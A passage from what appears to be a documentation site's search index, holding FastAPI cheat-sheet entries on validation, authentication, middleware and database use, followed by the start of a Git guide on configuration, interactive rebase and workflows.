validation\n@app.get(\"/items/{item_id}\")\ndef read_item(\n    item_id: int = Path(..., ge=1),  # Greater than or equal\n    q: Optional[str] = Query(None)\n):\n    return {\"item_id\": item_id, \"q\": q}\n\n# Float validation\n@app.get(\"/items/{item_id}\")\ndef read_item(\n    item_id: int = Path(..., ge=0, le=1000),\n    size: float = Query(..., gt=0, lt=10.5)\n):\n    return {\"item_id\": item_id, \"size\": size}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#body-validation","title":"Body Validation","text":"<pre><code>from pydantic import BaseModel, Field, EmailStr, HttpUrl\nfrom typing import Optional\n\nclass User(BaseModel):\n    username: str = Field(..., min_length=3, max_length=50)\n    email: EmailStr\n    full_name: Optional[str] = Field(None, max_length=100)\n    age: int = Field(..., ge=0, le=120)\n    website: Optional[HttpUrl] = None\n\n@app.post(\"/users/\")\ndef create_user(user: User):\n    return {\"user\": user}\n\n# Custom validators\nfrom pydantic import validator\n\nclass Item(BaseModel):\n    name: str\n    price: float\n    discount_price: Optional[float] = None\n\n    @validator('discount_price')\n    def discount_must_be_lower(cls, v, values):\n        if v is not None and 'price' in values and v &gt;= values['price']:\n            raise ValueError('discount_price must be lower than price')\n        return v\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#response-models","title":"Response Models","text":""},{"location":"cheat-sheet/fastapi/fastapi/#basic-response-model","title":"Basic Response Model","text":"<pre><code>from pydantic import BaseModel\nfrom typing import Optional\n\nclass Item(BaseModel):\n    name: str\n    description: Optional[str] = None\n    price: float\n    tax: Optional[float] = None\n\nclass ItemResponse(BaseModel):\n    name: str\n    price: float\n\n@app.post(\"/items/\", response_model=ItemResponse)\ndef create_item(item: Item):\n    return item\n\n# Response model excludes unset fields\n@app.post(\"/items/\", response_model=ItemResponse, response_model_exclude_unset=True)\ndef create_item(item: Item):\n    return item\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#response-status-code","title":"Response Status Code","text":"<pre><code>from fastapi import status\n\n@app.post(\"/items/\", status_code=status.HTTP_201_CREATED)\ndef create_item(item: Item):\n    return item\n\n@app.delete(\"/items/{item_id}\", status_code=status.HTTP_204_NO_CONTENT)\ndef delete_item(item_id: int):\n    return None\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#multiple-response-models","title":"Multiple Response Models","text":"<pre><code>from fastapi import Response\nfrom typing import Union\n\nclass ItemBase(BaseModel):\n    name: str\n    price: float\n\nclass ItemCreate(ItemBase):\n    pass\n\nclass ItemResponse(ItemBase):\n    id: int\n\n@app.post(\"/items/\", response_model=ItemResponse)\ndef create_item(item: ItemCreate):\n    # Simulate database creation\n    return {**item.dict(), \"id\": 1}\n\n# Union response\n@app.get(\"/items/{item_id}\", response_model=Union[ItemResponse, dict])\ndef read_item(item_id: int):\n    if item_id == 1:\n        return ItemResponse(id=1, name=\"Item 1\", price=10.5)\n    return {\"error\": \"Item not found\"}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#form-data","title":"Form Data","text":"<pre><code>from fastapi import Form\n\n@app.post(\"/login/\")\ndef login(username: str = Form(...), password: str = Form(...)):\n    return {\"username\": username}\n\n# Multiple form fields\n@app.post(\"/register/\")\ndef register(\n    username: str = Form(...),\n    password: str = Form(...),\n    email: str = Form(...),\n    full_name: Optional[str] = Form(None)\n):\n    return {\"username\": username, \"email\": email}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#file-uploads","title":"File Uploads","text":"<pre><code>from fastapi import File, UploadFile\nfrom typing import List\n\n# Upload file bytes\n@app.post(\"/files/\")\ndef create_file(file: bytes = File(...)):\n    return {\"file_size\": len(file)}\n\n# Upload file with UploadFile\n@app.post(\"/uploadfile/\")\nasync def create_upload_file(file: UploadFile = File(...)):\n    contents = await file.read()\n    return {\n        \"filename\": file.filename,\n        \"content_type\": file.content_type,\n        \"size\": len(contents)\n    }\n\n# Multiple files\n@app.post(\"/uploadfiles/\")\nasync def create_upload_files(files: List[UploadFile] = File(...)):\n    return {\"filenames\": [file.filename for file in files]}\n\n# File with form data\n@app.post(\"/files/\")\nasync def create_file(\n    file: UploadFile = File(...),\n    token: str = Form(...)\n):\n    return {\"filename\": file.filename, \"token\": token}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#error-handling","title":"Error Handling","text":"<pre><code>from fastapi import HTTPException, status\n\n@app.get(\"/items/{item_id}\")\ndef read_item(item_id: int):\n    if item_id not in items_db:\n        raise HTTPException(\n            status_code=status.HTTP_404_NOT_FOUND,\n            detail=\"Item not found\"\n        )\n    return items_db[item_id]\n\n# Custom exception\nfrom fastapi.responses import JSONResponse\n\nclass UnicornException(Exception):\n    def __init__(self, name: str):\n        self.name = name\n\n@app.exception_handler(UnicornException)\nasync def unicorn_exception_handler(request, exc: UnicornException):\n    return JSONResponse(\n        status_code=418,\n        content={\"message\": f\"Oops! {exc.name} did something wrong.\"}\n    )\n\n@app.get(\"/unicorns/{name}\")\nasync def read_unicorn(name: str):\n    if name == \"yolo\":\n        raise UnicornException(name=name)\n    return {\"unicorn_name\": name}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#dependencies","title":"Dependencies","text":""},{"location":"cheat-sheet/fastapi/fastapi/#basic-dependency","title":"Basic Dependency","text":"<pre><code>from fastapi import Depends\n\ndef common_parameters(q: Optional[str] = None, skip: int = 0, limit: int = 100):\n    return {\"q\": q, \"skip\": skip, \"limit\": limit}\n\n@app.get(\"/items/\")\ndef read_items(commons: dict = Depends(common_parameters)):\n    return commons\n\n@app.get(\"/users/\")\ndef read_users(commons: dict = Depends(common_parameters)):\n    return commons\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#class-dependencies","title":"Class Dependencies","text":"<pre><code>class CommonQueryParams:\n    def __init__(self, q: Optional[str] = None, skip: int = 0, limit: int = 100):\n        self.q = q\n        self.skip = skip\n        self.limit = limit\n\n@app.get(\"/items/\")\ndef read_items(commons: CommonQueryParams = Depends()):\n    return {\"q\": commons.q, \"skip\": commons.skip, \"limit\": commons.limit}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#sub-dependencies","title":"Sub-dependencies","text":"<pre><code>def query_extractor(q: Optional[str] = None):\n    return q\n\ndef query_or_cookie_extractor(\n    q: str = Depends(query_extractor),\n    last_query: Optional[str] = Cookie(None)\n):\n    if not q:\n        return last_query\n    return q\n\n@app.get(\"/items/\")\ndef read_query(query: str = Depends(query_or_cookie_extractor)):\n    return {\"query\": query}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#global-dependencies","title":"Global Dependencies","text":"<pre><code>app = FastAPI(dependencies=[Depends(verify_token)])\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#authentication","title":"Authentication","text":""},{"location":"cheat-sheet/fastapi/fastapi/#basic-http-auth","title":"Basic HTTP Auth","text":"<pre><code>from fastapi import Depends, HTTPException, status\nfrom fastapi.security import HTTPBasic, HTTPBasicCredentials\nimport secrets\n\nsecurity = HTTPBasic()\n\ndef get_current_username(credentials: HTTPBasicCredentials = Depends(security)):\n    correct_username = secrets.compare_digest(credentials.username, \"admin\")\n    correct_password = secrets.compare_digest(credentials.password, \"secret\")\n    if not (correct_username and correct_password):\n        raise HTTPException(\n            status_code=status.HTTP_401_UNAUTHORIZED,\n            detail=\"Incorrect username or password\",\n            headers={\"WWW-Authenticate\": \"Basic\"},\n        )\n    return credentials.username\n\n@app.get(\"/users/me\")\ndef read_current_user(username: str = Depends(get_current_username)):\n    return {\"username\": username}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#oauth2-with-password-flow","title":"OAuth2 with Password Flow","text":"<pre><code>from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm\nfrom passlib.context import CryptContext\nfrom jose import JWTError, jwt\nfrom datetime import datetime, timedelta\n\noauth2_scheme = OAuth2PasswordBearer(tokenUrl=\"token\")\n\nSECRET_KEY = \"your-secret-key\"\nALGORITHM = \"HS256\"\nACCESS_TOKEN_EXPIRE_MINUTES = 30\n\npwd_context = CryptContext(schemes=[\"bcrypt\"], deprecated=\"auto\")\n\nclass User(BaseModel):\n    username: str\n    email: Optional[str] = None\n    full_name: Optional[str] = None\n    disabled: Optional[bool] = None\n\nclass UserInDB(User):\n    hashed_password: str\n\ndef verify_password(plain_password, hashed_password):\n    return pwd_context.verify(plain_password, hashed_password)\n\ndef get_password_hash(password):\n    return pwd_context.hash(password)\n\ndef create_access_token(data: dict, expires_delta: Optional[timedelta] = None):\n    to_encode = data.copy()\n    if expires_delta:\n        expire = datetime.utcnow() + expires_delta\n    else:\n        expire = datetime.utcnow() + timedelta(minutes=15)\n    to_encode.update({\"exp\": expire})\n    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)\n    return encoded_jwt\n\nasync def get_current_user(token: str = Depends(oauth2_scheme)):\n    credentials_exception = HTTPException(\n        status_code=status.HTTP_401_UNAUTHORIZED,\n        detail=\"Could not validate credentials\",\n        headers={\"WWW-Authenticate\": \"Bearer\"},\n    )\n    try:\n        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])\n        username: str = payload.get(\"sub\")\n        if username is None:\n            raise credentials_exception\n    except JWTError:\n        raise credentials_exception\n    # Get user from database\n    user = get_user(username)\n    if user is None:\n        raise credentials_exception\n    return user\n\n@app.post(\"/token\")\nasync def login(form_data: OAuth2PasswordRequestForm = Depends()):\n    user = authenticate_user(form_data.username, form_data.password)\n    if not user:\n        raise HTTPException(\n            status_code=status.HTTP_401_UNAUTHORIZED,\n            detail=\"Incorrect username or password\",\n            headers={\"WWW-Authenticate\": \"Bearer\"},\n        )\n    access_token_expires = timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)\n    access_token = create_access_token(\n        data={\"sub\": user.username}, expires_delta=access_token_expires\n    )\n    return {\"access_token\": access_token, \"token_type\": \"bearer\"}\n\n@app.get(\"/users/me\")\nasync def read_users_me(current_user: User = Depends(get_current_user)):\n    return current_user\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#middleware","title":"Middleware","text":""},{"location":"cheat-sheet/fastapi/fastapi/#basic-middleware","title":"Basic Middleware","text":"<pre><code>from fastapi import Request\nimport time\n\n@app.middleware(\"http\")\nasync def add_process_time_header(request: Request, call_next):\n    start_time = time.time()\n    response = await call_next(request)\n    process_time = time.time() - start_time\n    response.headers[\"X-Process-Time\"] = str(process_time)\n    return response\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#cors-middleware","title":"CORS Middleware","text":"<pre><code>from fastapi.middleware.cors import CORSMiddleware\n\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"*\"],  # Allow all origins\n    allow_credentials=True,\n    allow_methods=[\"*\"],\n    allow_headers=[\"*\"],\n)\n\n# Production example\napp.add_middleware(\n    CORSMiddleware,\n    allow_origins=[\"https://example.com\", \"https://www.example.com\"],\n    allow_credentials=True,\n    allow_methods=[\"GET\", \"POST\"],\n    allow_headers=[\"*\"],\n)\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#trusted-host-middleware","title":"Trusted Host Middleware","text":"<pre><code>from fastapi.middleware.trustedhost import TrustedHostMiddleware\n\napp.add_middleware(\n    TrustedHostMiddleware, hosts=[\"example.com\", \"*.example.com\"]\n)\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#gzip-middleware","title":"GZip Middleware","text":"<pre><code>from fastapi.middleware.gzip import GZipMiddleware\n\napp.add_middleware(GZipMiddleware, minimum_size=1000)\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#background-tasks","title":"Background Tasks","text":"<pre><code>from fastapi import BackgroundTasks\n\ndef write_log(message: str):\n    with open(\"log.txt\", \"a\") as log:\n        log.write(message + \"\\n\")\n\n@app.post(\"/send-notification/{email}\")\nasync def send_notification(\n    email: str,\n    background_tasks: BackgroundTasks\n):\n    background_tasks.add_task(write_log, f\"Notification sent to {email}\")\n    return {\"message\": \"Notification sent in the background\"}\n\n# Multiple background tasks\n@app.post(\"/send-notifications/\")\nasync def send_notifications(\n    background_tasks: BackgroundTasks,\n    emails: List[str]\n):\n    for email in emails:\n        background_tasks.add_task(write_log, f\"Notification sent to {email}\")\n    return {\"message\": f\"Notifications sent to {len(emails)} emails\"}\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#websockets","title":"WebSockets","text":"<pre><code>from fastapi import WebSocket\nfrom fastapi.responses import HTMLResponse\n\nhtml = \"\"\"\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;&lt;title&gt;WebSocket Test&lt;/title&gt;&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;WebSocket Test&lt;/h1&gt;\n    &lt;input id=\"messageText\" type=\"text\"/&gt;\n    &lt;button onclick=\"sendMessage()\"&gt;Send&lt;/button&gt;\n    &lt;ul id=\"messages\"&gt;&lt;/ul&gt;\n    &lt;script&gt;\n        var ws = new WebSocket(\"ws://localhost:8000/ws\");\n        ws.onmessage = function(event) {\n            var messages = document.getElementById('messages')\n            var message = document.createElement('li')\n            var content = document.createTextNode(event.data)\n            message.appendChild(content)\n            messages.appendChild(message)\n        };\n        function sendMessage() {\n            var input = document.getElementById(\"messageText\")\n            ws.send(input.value)\n            input.value = ''\n        }\n    &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n\"\"\"\n\n@app.get(\"/\")\nasync def get():\n    return HTMLResponse(html)\n\n@app.websocket(\"/ws\")\nasync def websocket_endpoint(websocket: WebSocket):\n    await websocket.accept()\n    while True:\n        data = await websocket.receive_text()\n        await websocket.send_text(f\"Message text was: {data}\")\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#testing","title":"Testing","text":"<pre><code>from fastapi.testclient import TestClient\n\nclient = TestClient(app)\n\ndef test_read_main():\n    response = client.get(\"/\")\n    assert response.status_code == 200\n    assert response.json() == {\"message\": \"Hello World\"}\n\ndef test_create_item():\n    response = client.post(\n        \"/items/\",\n        json={\"name\": \"Test Item\", \"price\": 10.5}\n    )\n    assert response.status_code == 200\n    assert response.json()[\"name\"] == \"Test Item\"\n\n# Test with authentication\ndef test_read_items_with_auth():\n    response = client.get(\n        \"/items/\",\n        headers={\"Authorization\": \"Bearer fake-token\"}\n    )\n    assert response.status_code == 200\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#database-integration","title":"Database Integration","text":""},{"location":"cheat-sheet/fastapi/fastapi/#sqlalchemy-example","title":"SQLAlchemy Example","text":"<pre><code>from sqlalchemy import create_engine, Column, Integer, String\nfrom sqlalchemy.ext.declarative import declarative_base\nfrom sqlalchemy.orm import sessionmaker, Session\n\nSQLALCHEMY_DATABASE_URL = \"sqlite:///./test.db\"\n\nengine = create_engine(SQLALCHEMY_DATABASE_URL, connect_args={\"check_same_thread\": False})\nSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)\n\nBase = declarative_base()\n\nclass User(Base):\n    __tablename__ = \"users\"\n    id = Column(Integer, primary_key=True, index=True)\n    email = Column(String, unique=True, index=True)\n    name = Column(String)\n\nBase.metadata.create_all(bind=engine)\n\n# Dependency\ndef get_db():\n    db = SessionLocal()\n    try:\n        yield db\n    finally:\n        db.close()\n\n# Routes\n@app.post(\"/users/\")\ndef create_user(email: str, name: str, db: Session = Depends(get_db)):\n    user = User(email=email, name=name)\n    db.add(user)\n    db.commit()\n    db.refresh(user)\n    return user\n\n@app.get(\"/users/\")\ndef read_users(skip: int = 0, limit: int = 100, db: Session = Depends(get_db)):\n    users = db.query(User).offset(skip).limit(limit).all()\n    return users\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#configuration","title":"Configuration","text":""},{"location":"cheat-sheet/fastapi/fastapi/#settings-with-pydantic","title":"Settings with Pydantic","text":"<pre><code>from pydantic_settings import BaseSettings\n\nclass Settings(BaseSettings):\n    app_name: str = \"FastAPI App\"\n    admin_email: str\n    items_per_page: int = 50\n    database_url: str\n\n    class Config:\n        env_file = \".env\"\n\nsettings = Settings()\n\n@app.get(\"/info\")\nasync def info():\n    return {\n        \"app_name\": settings.app_name,\n        \"admin_email\": settings.admin_email,\n        \"items_per_page\": settings.items_per_page\n    }\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#environment-variables-env","title":"Environment Variables (.env)","text":"<pre><code>APP_NAME=My FastAPI App\nADMIN_EMAIL=admin@example.com\nITEMS_PER_PAGE=50\nDATABASE_URL=postgresql://user:password@localhost/dbname\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#best-practices","title":"Best Practices","text":""},{"location":"cheat-sheet/fastapi/fastapi/#project-structure","title":"Project Structure","text":"<pre><code>myproject/\n\u251c\u2500\u2500 app/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u251c\u2500\u2500 main.py\n\u2502   \u251c\u2500\u2500 dependencies.py\n\u2502   \u251c\u2500\u2500 routers/\n\u2502   \u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u2502   \u251c\u2500\u2500 items.py\n\u2502   \u2502   \u2514\u2500\u2500 users.py\n\u2502   \u251c\u2500\u2500 models/\n\u2502   \u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u2502   \u2514\u2500\u2500 user.py\n\u2502   \u251c\u2500\u2500 schemas/\n\u2502   \u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u2502   \u2514\u2500\u2500 user.py\n\u2502   \u2514\u2500\u2500 crud/\n\u2502       \u251c\u2500\u2500 __init__.py\n\u2502       \u2514\u2500\u2500 user.py\n\u251c\u2500\u2500 tests/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u2514\u2500\u2500 test_main.py\n\u251c\u2500\u2500 requirements.txt\n\u251c\u2500\u2500 .env\n\u2514\u2500\u2500 README.md\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#use-routers","title":"Use Routers","text":"<pre><code># app/routers/users.py\nfrom fastapi import APIRouter\n\nrouter = APIRouter(\n    prefix=\"/users\",\n    tags=[\"users\"],\n    responses={404: {\"description\": \"Not found\"}},\n)\n\n@router.get(\"/\")\ndef read_users():\n    return [{\"username\": \"Rick\"}, {\"username\": \"Morty\"}]\n\n@router.get(\"/{user_id}\")\ndef read_user(user_id: int):\n    return {\"user_id\": user_id}\n\n# app/main.py\nfrom app.routers import users\n\napp.include_router(users.router)\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#asyncawait-best-practices","title":"Async/Await Best Practices","text":"<pre><code># Use async when doing I/O operations\n@app.get(\"/items/{item_id}\")\nasync def read_item(item_id: int):\n    result = await fetch_from_database(item_id)\n    return result\n\n# Use sync for CPU-bound operations\n@app.get(\"/calculate/{number}\")\ndef calculate(number: int):\n    result = heavy_computation(number)\n    return result\n</code></pre>"},{"location":"cheat-sheet/fastapi/fastapi/#resources","title":"Resources","text":"<ul> <li>Official documentation: https://fastapi.tiangolo.com/</li> <li>Tutorial: https://fastapi.tiangolo.com/tutorial/</li> <li>Reference: https://fastapi.tiangolo.com/reference/</li> <li>GitHub: https://github.com/tiangolo/fastapi</li> <li>Community: https://github.com/tiangolo/fastapi/discussions</li> </ul>"},{"location":"cheat-sheet/git/git/","title":"Git - Complete Guide","text":"<p>Git is a powerful and flexible distributed version control system, essential for any modern developer.</p>"},{"location":"cheat-sheet/git/git/#installation","title":"Installation","text":""},{"location":"cheat-sheet/git/git/#linux-ubuntudebian","title":"Linux (Ubuntu/Debian)","text":"<pre><code>sudo apt update\nsudo apt install git\n\ngit --version\n</code></pre>"},{"location":"cheat-sheet/git/git/#macos","title":"macOS","text":"<pre><code>brew install git\n\n# Or via Xcode Command Line Tools\nxcode-select --install\n</code></pre>"},{"location":"cheat-sheet/git/git/#windows","title":"Windows","text":"<pre><code>choco install git\n# Or download from https://git-scm.com/download/win\n</code></pre>"},{"location":"cheat-sheet/git/git/#initial-configuration","title":"Initial Configuration","text":""},{"location":"cheat-sheet/git/git/#identity","title":"Identity","text":"<pre><code>git config --global user.name \"Your Name\"\ngit config --global user.email \"email@example.com\"\n\n# Verify\ngit config --list\ngit config user.name\n</code></pre>"},{"location":"cheat-sheet/git/git/#editor-and-tools","title":"Editor and Tools","text":"<pre><code>git config --global core.editor \"vim\"\ngit config --global core.editor \"code --wait\"  # VS Code\ngit config --global diff.tool vimdiff\ngit config --global merge.tool vimdiff\ngit config --global color.ui auto\n</code></pre>"},{"location":"cheat-sheet/git/git/#multi-account-management","title":"Multi-Account Management","text":"<pre><code># ~/.gitconfig\n[includeIf \"gitdir:~/perso/\"]\n    path = ~/perso/.gitconfig\n\n[includeIf \"gitdir:~/work/\"]\n    path = ~/work/.gitconfig\n</code></pre> <pre><code># ~/perso/.gitconfig\n[user]\n    email = perso@example.com\n    name = Personal Name\n</code></pre>"},{"location":"cheat-sheet/git/git/#useful-aliases","title":"Useful Aliases","text":"<pre><code>git config --global alias.st status\ngit config --global alias.co checkout\ngit config --global alias.br branch\ngit config --global alias.ci commit\ngit config --global alias.unstage 'reset HEAD --'\ngit config --global alias.last 'log -1 HEAD'\ngit config --global alias.lg \"log --graph --pretty=tformat:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%an %cr)%Creset' --abbrev-commit\"\ngit config --global alias.amend 'commit --amend --no-edit'\n</code></pre>"},{"location":"cheat-sheet/git/git/#basic-commands","title":"Basic Commands","text":""},{"location":"cheat-sheet/git/git/#initialization","title":"Initialization","text":"<pre><code>git init\ngit init my-project\n\ngit clone https://github.com/user/repo.git\ngit clone https://github.com/user/repo.git my-folder\ngit clone --depth 1 https://github.com/user/repo.git  # Shallow clone\ngit clone --branch develop https://github.com/user/repo.git\n</code></pre>"},{"location":"cheat-sheet/git/git/#status-and-differences","title":"Status and Differences","text":"<pre><code>git status\ngit status -s              # Short format\n\ngit diff                   # Unstaged modifications\ngit diff --staged          # Staged modifications\ngit diff HEAD              # All modifications\ngit diff main..develop     # Between branches\ngit diff --stat            # Statistics\ngit diff --color-words     # Word-by-word differences\n</code></pre>"},{"location":"cheat-sheet/git/git/#staging-and-commits","title":"Staging and Commits","text":"<pre><code>git add file.txt\ngit add *.js\ngit add .\ngit add -A                 # All (additions, modifications, deletions)\ngit add -u                 # Only modifications/deletions\ngit add -p                 # Interactive mode\n\ngit reset HEAD file.txt\ngit restore --staged file.txt\n\ngit commit -m \"Message\"\ngit commit -am \"Message\"   # Add + commit\ngit commit --amend         # Modify the last commit\ngit commit --amend --no-edit\n</code></pre>"},{"location":"cheat-sheet/git/git/#advanced-interactive-rebase","title":"Advanced Interactive Rebase","text":""},{"location":"cheat-sheet/git/git/#basic-syntax","title":"Basic Syntax","text":"<pre><code># Rebase the last N commits\ngit rebase -i HEAD~5\ngit rebase -i main\n\n# Available actions:\n# pick   = use commit\n# reword = modify the message\n# edit   = stop to amend\n# squash = merge with previous\n# fixup  = like squash but ignore the message\n# drop   = delete the commit\n</code></pre>"},{"location":"cheat-sheet/git/git/#complete-interactive-rebase-example","title":"Complete Interactive Rebase Example","text":"<pre><code># Situation: 5 commits to clean up\ngit log --oneline -5\n# abc123 Fix typo\n# def456 Add feature X\n# ghi789 WIP\n# jkl012 Add tests\n# mno345 Update docs\n\n# Start the rebase\ngit rebase -i HEAD~5\n\n# In the editor:\npick mno345 Update docs\nreword jkl012 Add tests              # Modify the message\nsquash ghi789 WIP                    # Merge with jkl012\nfixup def456 Add feature X           # Merge with ghi789 without message\ndrop abc123 Fix typo                 # Delete this commit\n\n# Result: 2 clean commits instead of 5\n</code></pre>"},{"location":"cheat-sheet/git/git/#squashing-merging-commits","title":"Squashing - Merging Commits","text":"<pre><code># Method 1: Interactive rebase\ngit rebase -i HEAD~3\n# Mark commits with 'squash' or 'fixup'\n\n# Method 2: Soft reset\ngit reset --soft HEAD~3\ngit commit -m \"Single message for the 3 commits\"\n\n# Method 3: Merge --squash\ngit checkout main\ngit merge --squash feature-branch\ngit commit -m \"Feature: complete description\"\n</code></pre>"},{"location":"cheat-sheet/git/git/#splitting-separating-a-commit","title":"Splitting - Separating a Commit","text":"<pre><code># Split a large commit into several smaller ones\ngit rebase -i HEAD~3\n\n# Mark the commit with 'edit'\n# When the rebase stops:\ngit reset HEAD^          # Undo the commit, keep the changes\n\n# Create several commits\ngit add file1.txt\ngit commit -m \"First part: file1\"\n\ngit add file2.txt\ngit commit -m \"Second part: file2\"\n\ngit add file3.txt\ngit commit -m \"Third part: file3\"\n\ngit rebase --continue\n</code></pre>"},{"location":"cheat-sheet/git/git/#editing-modifying-a-commit","title":"Editing - Modifying a Commit","text":"<pre><code>git rebase -i HEAD~5\n\n# Mark with 'edit' the commit to modify\n# The rebase stops on this commit\n\n# Make the modifications\ngit add modified-file.txt\ngit commit --amend\n\n# Or add a new commit\ngit add new-file.txt\ngit commit -m \"Forgotten addition\"\n\ngit rebase --continue\n</code></pre>"},{"location":"cheat-sheet/git/git/#reordering-reorganizing-commits","title":"Reordering - Reorganizing Commits","text":"<pre><code>git rebase -i HEAD~5\n\n# In the editor, change the order of lines:\n# Before:\n# pick abc123 Commit A\n# pick def456 Commit B\n# pick ghi789 Commit C\n#\n# After (reversed order):\n# pick ghi789 Commit C\n# pick def456 Commit B\n# pick abc123 Commit A\n</code></pre>"},{"location":"cheat-sheet/git/git/#fixup-and-autosquash","title":"Fixup and Autosquash","text":"<pre><code># Create a fixup commit\ngit add file.txt\ngit commit --fixup HEAD~2\n# Automatic message: \"fixup! Message of commit HEAD~2\"\n\n# Create a squash commit\ngit commit --squash abc123\n\n# Rebase with autosquash\ngit rebase -i --autosquash HEAD~10\n# The fixup/squash commits are automatically placed\n\n# Enable autosquash by default\ngit config --global rebase.autosquash true\n\n# Complete workflow\n# 1. Make a commit\ngit commit -m \"Add feature\"\n\n# 2. Find a bug in this commit\ngit add fix.txt\ngit commit --fixup HEAD\n\n# 3. Make other commits\ngit commit -m \"Other work\"\n\n# 4. Clean up the history\ngit rebase -i --autosquash HEAD~10\n# The fixup will be automatically merged with the right commit\n</code></pre>"},{"location":"cheat-sheet/git/git/#rebasing-with-conflict-resolution","title":"Rebasing with Conflict Resolution","text":"<pre><code>git rebase main\n\n# If conflict:\ngit status  # See conflicting files\n\n# Manually resolve the files\n# (edit the markers &lt;&lt;&lt;&lt;&lt;&lt;&lt;, =======, &gt;&gt;&gt;&gt;&gt;&gt;&gt;)\n\ngit add resolved-file.txt\ngit rebase --continue\n\n# Or abort\ngit rebase --abort\n\n# Or skip the problematic commit\ngit rebase --skip\n\n# Resolution strategies\ngit rebase -X theirs main    # Take their version in case of conflict\ngit rebase -X ours main      # Take our version\n</code></pre>"},{"location":"cheat-sheet/git/git/#rebase-onto-complex-cases","title":"Rebase --onto (Complex Cases)","text":"<pre><code># Syntax: git rebase --onto &lt;newbase&gt; &lt;upstream&gt; &lt;branch&gt;\n\n# Example 1: Move a branch\n# State: main &lt;- featureA &lt;- featureB\n# Goal: main &lt;- featureB (without commits from featureA)\ngit rebase --onto main featureA featureB\n\n# Example 2: Remove intermediate commits\n# Remove commits between abc123 and def456\ngit rebase --onto abc123 def456\n\n# Example 3: Move a series of commits\n# Move commits E-F from D to C\n#     A - B - C        (main)\n#      \\\n#       D - E - F      (topic)\ngit rebase --onto C D F\n\n# Result:\n#     A - B - C - E' - F'\n</code></pre>"},{"location":"cheat-sheet/git/git/#cherry-picking-and-rebase","title":"Cherry-picking and Rebase","text":"<pre><code># Cherry-pick a specific commit\ngit cherry-pick abc123\ngit cherry-pick abc123 def456     # Multiple\ngit cherry-pick abc123^..def456   # Range\n\n# Without automatic commit\ngit cherry-pick -n abc123\n\n# Edit the message\ngit cherry-pick -e abc123\n\n# With signature\ngit cherry-pick -x abc123\n\n# In case of conflict\ngit cherry-pick --continue\ngit cherry-pick --abort\n\n# Cherry-pick a series via rebase\ngit rebase --onto target-branch start-commit end-commit\n</code></pre>"},{"location":"cheat-sheet/git/git/#git-workflows","title":"Git Workflows","text":""},{"location":"cheat-sheet/git/git/#github-flow","title":"GitHub Flow","text":"<pre><code># 1. Create a branch\ngit checkout main\ngit pull\ngit checkout -b feature/new-feature\n\n# 2. Commits\ngit add .\ngit commit -m \"feat: new feature\"\ngit push -u origin feature/new-feature\n\n# 3. Pull Request\ngh pr create --title \"New feature\"\n\n# 4. Review and merge\ngh pr merge --squash\n\n# 5. Cleanup\ngit checkout main\ngit pull\ngit branch -d feature/new-feature\n</code></pre>"},{"location":"cheat-sheet/git/git/#gitflow","title":"Gitflow","text":"<pre><code># Branches: main, develop, feature/*, release/*, hotfix/*\n\n# Feature\ngit checkout develop\ngit checkout -b feature/my-feature\n# ... development ...\ngit checkout develop\ngit merge --no-ff feature/my-feature\ngit branch -d feature/my-feature\n\n# Release\ngit checkout develop\ngit checkout -b release/1.0.0\n# ... bump version ...\ngit checkout main\ngit merge --no-ff release/1.0.0\ngit tag -a v1.0.0 -m \"Version 1.0.0\"\ngit checkout develop\ngit merge --no-ff release/1.0.0\ngit branch -d release/1.0.0\n\n# Hotfix\ngit checkout main\ngit checkout -b hotfix/critical-bug\n# ... fix ...\ngit checkout main\ngit merge --no-ff hotfix/critical-bug\ngit tag -a v1.0.1 -m \"Hotfix 1.0.1\"\ngit checkout develop\ngit merge --no-ff hotfix/critical-bug\ngit branch -d hotfix/critical-bug\n</code></pre>"},{"location":"cheat-sheet/git/git/#history-and-investigation","title":"History and Investigation","text":""},{"location":"cheat-sheet/git/git/#advanced-git-log","title":"Advanced git log","text":"<pre><code># Formats\ngit log --oneline\ngit log --graph --oneline --all\ngit log --stat\ngit log -p                 # With diffs\ngit log -p -2              # Last 2 with diffs\n\n# Time filters\ngit log --since=\"2 weeks ago\"\ngit log --since=\"2024-01-01\" 